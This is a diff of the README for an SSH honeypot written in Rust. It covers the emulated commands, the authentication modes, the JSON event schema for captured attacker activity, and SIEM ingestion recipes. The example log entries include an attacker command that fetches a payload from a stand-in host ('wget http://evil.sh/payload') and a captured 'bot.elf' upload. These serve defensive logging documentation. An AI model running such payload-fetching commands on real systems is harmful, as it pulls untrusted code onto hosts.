@@ -1,10 +1,11 @@
 # MIMIC — SSH Honeypot
 
+[![CI](https://github.com/Kevin1S1/mimic-ssh-honeypot/actions/workflows/ci.yml/badge.svg)](https://github.com/Kevin1S1/mimic-ssh-honeypot/actions/workflows/ci.yml)
 [![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue)](#license)
 [![Rust](https://img.shields.io/badge/rust-1.88%2B-orange)](https://www.rust-lang.org/)
 [![unsafe: forbidden](https://img.shields.io/badge/unsafe-forbidden-success)](#security-architecture)
 
-A medium-to-high interaction SSH honeypot written in Rust. MIMIC presents attackers with a fully convincing Debian 12 shell — realistic prompt, MOTD, filesystem, and ~50 emulated commands — while the entire session runs as a **pure in-memory state machine**. No shell process is ever spawned. No real filesystem is ever touched. The Rust compiler statically enforces this through `#![forbid(unsafe_code)]` and strict module-visibility boundaries.
+A medium-to-high interaction SSH honeypot written in Rust. MIMIC presents attackers with a fully convincing Debian 12 shell — realistic prompt, MOTD, filesystem, and ~100 emulated commands — while the entire session runs as a **pure in-memory state machine**. No shell process is ever spawned. No real filesystem is ever touched. The Rust compiler statically enforces this through `#![forbid(unsafe_code)]` and strict module-visibility boundaries.
 
 Every attacker action — authentication attempts, commands, `wget`/`curl` downloads, and SCP/SFTP uploads — is captured as a structured JSON event, ready for SIEM ingestion or offline analysis.
 
@@ -43,7 +44,7 @@ MIMIC is split into five strictly isolated layers. Only the Network layer is all
 │  4. Virtual Filesystem (VFS)             │  In-memory inode tree, path
 │     src/vfs/                             │  resolution, symlinks, /proc
 ├──────────────────────────────────────────┤
-│  5. Command Registry                     │  ~50 emulated commands — each is
+│  5. Command Registry                     │  ~100 emulated commands — each is
 │     src/commands/                        │  a pure Rust function, no OS calls
 └──────────────────────────────────────────┘
          ║                      ║
@@ -92,12 +93,15 @@ Home directories for non-root attackers are created automatically under `/home/<
 |---|---|
 | **Navigation** | `ls` (`-a`/`-A`/`-d`/`-l`/`-h`/`-1`), `cd` (`~`/`-`/`..`), `pwd` |
 | **File ops** | `cat`, `touch`, `mkdir` (`-p`), `rm` (`-r`/`-f`), `rmdir`, `cp` (`-r`), `mv`, `chmod` (octal + symbolic), `tar` (`-c`/`-x`/`-t`/`-v`, dashless bundled flags) |
-| **Text** | `echo` (`-n`/`-e`), `grep` (`-i`/`-v`/`-n`/`-c`/`-r`, literal substring match), `find` (`-name`/`-type`, glob `-name`), `head`/`tail` (`-n`/`-c`/`-N`), `wc` (`-l`/`-w`/`-c`) |
+| **Text** | `echo` (`-n`/`-e`), `printf`, `grep` (`-i`/`-v`/`-n`/`-c`/`-r`/`-q`/`-l`/`-w`/`-o`/`-s`/`-h`/`-H`/`-e`, with `-E`/`-F`/`-G`/`-P` accepted; literal substring match), `find` (`-name`/`-type`, glob `-name`), `head`/`tail` (`-n`/`-c`/`-N`), `wc` (`-l`/`-w`/`-c`) |
+| **Text plumbing** | `sed` (`s///`, `d`, `p`, any delimiter, literal patterns), `cut` (`-d`/`-f`/`-c`), `tr` (`-d`/`-s`, ranges, POSIX classes), `sort` (`-r`/`-n`/`-u`), `uniq` (`-c`/`-d`/`-u`), `xargs` (`-n`), `tee` (`-a`), `rev`, `nl`, `seq`, `basename`, `dirname`, `base64` (`-d`/`-w0`), `sha256sum`, `sha512sum` |
+| **Accounts** | `passwd` (prompts twice, echo suppressed), `chpasswd`, `useradd`/`adduser` (`-m`/`-s`/`-u`), `userdel`/`deluser`, `groupadd`/`addgroup`, `getent` (`passwd`/`group`/`shadow`/`hosts`) |
+| **Services** | `systemctl` (`status`/`is-active`/`is-enabled`/`list-units`/`start`/`stop`/`enable`/`disable`/`daemon-reload`), `service`, `nohup`, `chattr`, `lsattr`, `sleep`, `sync`, `nologin` |
 | **Identity** | `whoami`, `id`, `groups`, `uname` (`-a`/`-s`/`-n`/`-r`/`-v`/`-m`/`-o`), `arch`, `hostname`, `nproc`, `lscpu`, `lsb_release` (`-a`/`-s`/`-i`/`-d`/`-r`/`-c`), `tty`, `date` (`+FORMAT`) |
 | **Privilege** | `sudo` (transient elevation for one command; `-i`/`-s` hand over a root shell for the session), `su` (identity switch; prompts a non-root user for a password) |
-| **Shells** | `bash`/`sh` (`-c LINE` runs the line; bare invocation acts as a subshell), `scp` (local copy; remote operands fail as unreachable) |
+| **Shells** | `bash`/`sh` (`-c LINE`, a script operand read from the VFS, or piped stdin — each line runs through the same shell that would have run it interactively), `scp` (local copy; remote operands fail as unreachable) |
 | **Environment** | `env`, `export`, `unset`, `clear` |
-| **Processes** | `ps` (`aux`/`-ef`), `top` (holds the screen and repaints until `q`; `-b`/`-n` dump once), `kill`, `pkill`, `free`, `uptime` |
+| **Processes** | `ps` (`aux`/`-ef`), `top` (holds the screen and repaints until `q`; `-b`/`-n` dump once), `kill`, `pkill`, `killall`, `pidof`, `pgrep` (`-l`), `free`, `uptime` |
 | **Networking** | `wget`, `curl`, `ping`, `netstat`, `ss`, `ip` |
 | **Recon** | `history`, `which`, `w`, `last`, `df` (`-h`), `mount`, `crontab` (`-l`), `dmesg` (root-only, `dmesg_restrict`) |
 | **Packages** | `apt`, `apt-get`, `dpkg` (stubs — install requires root, fake package DB) |
@@ -205,7 +209,7 @@ accept_after = 2
 |---|---|---|
 | `accept_all` | Every password works on the first try | Maximum attacker interaction, capturing commands |
 | `reject_all` | Always rejects — captures creds but never grants a shell | Passive credential harvesting only |
-| `accept_after` | Rejects the first N−1 attempts and accepts the Nth (`accept_after = 2` → the second password works) | Realistic (attackers expect a few tries) |
+| `accept_after` | Rejects the first N−1 attempts and accepts the Nth (`accept_after = 2` → the second password works). Must be `1..=6`: `0` would silently mean `accept_all`, and the server enforces Debian's `MaxAuthTries 6`, so a larger value disconnects the client before the accepting attempt is reached | Realistic (attackers expect a few tries) |
 | `credentials` | Only specific pairs succeed | Targeted studies |
 
 ---
@@ -231,20 +235,28 @@ When no `dir` is configured, storage and rotation are delegated to whatever capt
 - **Docker Compose**: the `json-file` driver ([docker-compose.yml](docker-compose.yml)) rotates at 10 MB × 5 files. The underlying files live under Docker's internal storage (`/var/lib/docker/containers/<container-id>/<container-id>-json.log`) — treat that as an implementation detail and use `docker compose logs -f` / `docker logs mimic` instead of reading it directly.
 - **systemd**: captured by journald ([deploy/mimic.service](deploy/mimic.service)); view with `journalctl -u mimic -f`, retention governed by your journald config.
 
-Pipe to `jq` or ship to your SIEM.
+Pipe to `jq`, or ship to your SIEM with one of the recipes below.
 
 ```jsonc
 // New connection
-{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","sensor_name":"mimic","session_id":42,"peer":"1.2.3.4:54321"}}
+{"timestamp":"…","level":"INFO","fields":{"event":"connection_opened","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321}}
 
 // Connection refused (over limit)
-{"fields":{"event":"connection_rejected","sensor_name":"mimic","peer":"1.2.3.4:54322","reason":"per_ip_limit"}}
+{"fields":{"event":"connection_rejected","sensor_name":"mimic","boot_id":"3f9c…","peer":"1.2.3.4:54322","src_ip":"1.2.3.4","src_port":54322,"reason":"per_ip_limit"}}
 
 // Credential capture
-{"fields":{"event":"auth_attempt","sensor_name":"mimic","session_id":42,"peer":"…","username":"root","method":"password","password":"hunter2","accepted":true}}
+{"fields":{"event":"auth_attempt","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","src_ip":"1.2.3.4","src_port":54321,"username":"root","method":"password","password":"hunter2","accepted":true}}
+
+// Public key offered: the fingerprint is a pivotable IOC in a way a sprayed
+// password rarely is, since attackers reuse key material across campaigns.
+{"fields":{"event":"auth_attempt","sensor_name":"mimic","session_id":42,"username":"root","method":"publickey","fingerprint":"SHA256:6dq…","accepted":false}}
+
+// The client's own SSH implementation — often the single most useful triage
+// field for separating commodity botnets from targeted activity.
+{"fields":{"event":"client_banner","sensor_name":"mimic","session_id":42,"banner":"SSH-2.0-libssh2_1.9.0"}}
 
 // Command typed by attacker
-{"fields":{"event":"command","sensor_name":"mimic","session_id":42,"peer":"…","command":"wget http://evil.sh/payload"}}
+{"fields":{"event":"command","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","command":"wget http://evil.sh/payload","source":"exec","status":0}}
 
 // wget/curl download logged
 {"fields":{"event":"download","sensor_name":"mimic","session_id":42,"peer":"…","tool":"wget","url":"http://evil.sh/payload","dest":"/tmp/payload"}}
@@ -260,7 +272,7 @@ Pipe to `jq` or ship to your SIEM.
 {"fields":{"event":"upload","sensor_name":"mimic","session_id":42,"peer":"…","name":"bot.elf","dest":"/tmp/bot.elf","size":98304,"sha256":"a3f…","stored_sha256":"a3f…","stored_path":"/data/quarantine/a3f…","truncated":false}}
 
 // Session ended
-{"fields":{"event":"connection_closed","sensor_name":"mimic","session_id":42,"peer":"…"}}
+{"fields":{"event":"connection_closed","sensor_name":"mimic","boot_id":"3f9c…","session_id":42,"peer":"…","duration_secs":37,"command_count":9}}
 ```
 
 Parse with jq:
@@ -271,6 +283,132 @@ docker logs mimic | jq 'select(.fields.event=="auth_attempt") | {ip:.fields.peer
 # List downloaded URLs
 docker logs mimic | jq 'select(.fields.event=="download") | .fields.url'
 ```
+
+### Every event, and what carries it
+
+Fifteen event types share one envelope. `sensor_name` and `boot_id` are on all
+of them; everything that happens inside a session also carries `session_id`,
+`peer`, `src_ip` and `src_port`.
+
+| `event` | Level | Session-scoped | What it means |
+|---|---|---|---|
+| `listening` | INFO | no | The listener bound. Emitted once per process start. |
+| `shutdown` | INFO | no | SIGTERM/SIGINT received; buffered log lines are flushed. |
+| `accept_error` | WARN | no | The accept loop failed on one connection. |
+| `connection_rejected` | INFO | **no `session_id`** | Refused before a session existed (`per_ip_limit` / `global_limit`). |
+| `connection_opened` | INFO | yes | A session was created. |
+| `client_banner` | INFO | yes | The client's SSH version string, at first channel open. |
+| `auth_attempt` | INFO | yes | A credential was offered. Carries `password` (cleartext) or a public-key `fingerprint`. |
+| `command` | INFO | yes | A command line ran. Carries `source` and `status`. |
+| `download` | INFO | yes | `wget`/`curl` was used. No real request was made. |
+| `subsystem_request` | INFO | yes | A subsystem (e.g. SFTP) was requested. |
+| `upload` | INFO | yes | An SCP/SFTP payload was captured to the quarantine store. |
+| `quarantine_session_cap` | WARN | yes | The session hit its real-disk write cap; the payload is still in the VFS. |
+| `quarantine_error` | WARN | yes | **A payload capture failed.** The one event worth paging on. |
+| `session_timeout` | INFO | yes | *We* cut the session off, rather than the attacker leaving. |
+| `connection_closed` | INFO | yes | Session ended. Carries `duration_secs` and `command_count`. |
+
+Two caveats that produce silently wrong dashboards rather than errors:
+
+- **Correlate on `boot_id` + `session_id`, never `session_id` alone.**
+  `session_id` restarts at 1 on every process start, and the
+  [Daily Reset](#daily-reset) restarts the process every day — so a
+  `transaction session_id` spanning a restart merges unrelated sessions into one
+  apparent intrusion, with nothing in the data to indicate it happened.
+- **`connection_rejected` has no `session_id`.** It precedes session creation, so
+  any query that joins on `session_id` silently drops every rate-limited
+  connection. If you are measuring flood volume, count these separately.
+
+### `command` events: telling a bot from a human
+
+```jsonc
+{"fields":{"event":"command","sensor_name":"mimic","boot_id":"…","session_id":42,
+           "peer":"1.2.3.4:54321","src_ip":"1.2.3.4","src_port":54321,
+           "command":"wget http://evil.sh/payload","source":"exec","status":0}}
+```
+
+- `source` is `interactive` (typed at a PTY), `exec` (`ssh host 'cmd'`), `pipe`
+  (a shell channel with no terminal), `heredoc`, `script` (one line of a body
+  `sh` ran out of the VFS or off a pipe — the inside of a dropper, never typed
+  by the client), or `transfer` (SCP). Anything other than `interactive` is
+  close to a bot marker on its own.
+- `status` is the exit code, or `-1` when the line is logged before it runs.
+  **`status: 127` is the most useful single query a honeypot operator has** — it
+  names the commands attackers expected to work that this box does not emulate,
+  which is exactly the list worth implementing next.
+
+```bash
+# What are attackers reaching for that MIMIC does not have?
+jq -r 'select(.fields.event=="command" and .fields.status==127) | .fields.command' \
+  mimic.*.jsonl | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
+
+# Sessions that look manual rather than automated
+jq -r 'select(.fields.event=="command" and .fields.source=="interactive")
+       | .fields.session_id' mimic.*.jsonl | sort -u
+```
+
+### Splunk
+
+Every field lands under `fields.*` because that is how `tracing`'s JSON
+formatter nests them. Rather than carrying the `fields.` prefix through every
+SPL search forever, rename once at index time:
+
+```ini
+# props.conf
+[mimic:json]
+INDEXED_EXTRACTIONS = json
+KV_MODE             = none
+TIME_PREFIX         = "timestamp":"
+TIME_FORMAT         = %Y-%m-%dT%H:%M:%S.%6NZ
+MAX_TIMESTAMP_LOOKAHEAD = 32
+TRUNCATE            = 0
+SHOULD_LINEMERGE    = false
+FIELDALIAS-mimic    = fields.src_ip AS src_ip fields.src_port AS src_port \
+                      fields.username AS user fields.event AS action \
+                      fields.session_id AS session_id fields.boot_id AS boot_id
+EVAL-app            = "mimic"
+EVAL-vendor_product = "MIMIC SSH Honeypot"
+```
+
+```ini
+# inputs.conf
+[monitor:///data/logs/mimic.*.jsonl]
+sourcetype = mimic:json
+index      = honeypot
+```
+
+The `src_ip`/`user`/`action` aliases are the Splunk CIM Authentication and
+Network Traffic names, so `auth_attempt` events drop into CIM-based dashboards
+without further mapping.
+
+### Elastic / ECS
+
+`filebeat.yml` — the `peer` string is already split into `src_ip`/`src_port` by
+the honeypot, so no ingest-pipeline grok is needed:
+
+```yaml
+filebeat.inputs:
+  - type: filestream
+    id: mimic
+    paths: ["/data/logs/mimic.*.jsonl"]
+    parsers:
+      - ndjson:
+          target: ""
+          overwrite_keys: true
+processors:
+  - rename:
+      fields:
+        - { from: "fields.src_ip",     to: "source.ip" }
+        - { from: "fields.src_port",   to: "source.port" }
+        - { from: "fields.username",   to: "user.name" }
+        - { from: "fields.event",      to: "event.action" }
+        - { from: "fields.session_id", to: "event.id" }
+      ignore_missing: true
+  - add_fields:
+      target: event
+      fields: { dataset: "mimic.ssh", category: "intrusion_detection", kind: "event" }
+```
+
 
 ---
 
@@ -421,6 +559,10 @@ The full threat model, attack-surface matrix, security invariants, and vulnerabi
 ---
 
 ## Contributing
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for the two conventions that are
+load-bearing here — the build-enforced module boundary and the `// ponytail:`
+marker for deliberate emulation shortcuts.
 
 Pull requests are welcome. Before submitting, run local quality checks:
 
